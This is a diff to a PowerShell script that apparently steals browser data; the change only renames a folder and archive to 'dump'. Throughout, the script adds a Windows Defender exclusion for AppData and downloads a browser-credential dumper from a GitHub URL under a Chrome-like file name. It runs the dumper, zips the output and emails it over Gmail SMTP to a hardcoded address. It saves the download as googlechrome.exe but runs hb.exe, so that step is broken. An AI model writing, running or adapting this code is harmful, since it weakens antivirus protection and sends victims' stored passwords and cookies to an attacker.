@@ -1,14 +1,14 @@
 #Adding windows defender exclusionpath
 Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
-mkdir "$env:appdata\Microsoft\microsoftstorage"
-Set-Location "$env:appdata\Microsoft\microsoftstorage"
+mkdir "$env:appdata\Microsoft\dump"
+Set-Location "$env:appdata\Microsoft\dump"
 #Downloading and executing hackbrowser.exe
 Invoke-WebRequest 'https://github.com/epicthoistaken/googlechromeyes/raw/main/googlechromeclientyes.exe' -OutFile "googlechrome.exe"
 .\hb.exe --format json
-Remove-Item -Path "$env:appdata\Microsoft\microsoftstorage\googlechrome.exe" -Force
+Remove-Item -Path "$env:appdata\Microsoft\dump\googlechrome.exe" -Force
 #Creating A Zip Archive
-Compress-Archive -Path * -DestinationPath google.zip
+Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
 $SMTPServer = 'smtp.gmail.com'
@@ -21,7 +21,7 @@ $ReportEmail.To.Add('beneafrr@gmail.com')
 $ReportEmail.Subject = "Googlechrome"
 $ReportEmail.Body = 'Opening web.'
 $files=Get-ChildItem 
-$ReportEmail.Attachments.Add("$env:appdata\Microsoft\microsoftstorage\google.zip")
+$ReportEmail.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
 $SMTPInfo.Send($ReportEmail)
 $ReportEmail.Dispose()
 $SMTPInfo.Dispose()
